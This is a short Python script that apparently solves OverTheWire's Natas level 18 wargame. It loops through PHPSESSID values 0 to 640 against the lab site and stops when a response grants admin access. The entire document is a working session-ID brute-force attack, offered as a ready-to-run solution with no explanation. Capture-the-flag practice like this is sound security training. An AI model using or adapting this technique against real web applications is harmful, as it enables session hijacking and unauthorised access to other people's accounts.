#!/usr/bin/python
import requests

for sessid in range(641):
	r = requests.get('http://natas18.natas.labs.overthewire.org?debug=1', auth=('',''), cookies={'PHPSESSID':str(sessid)})

	if 'You are an admin' in r.content:
		print r.content
		break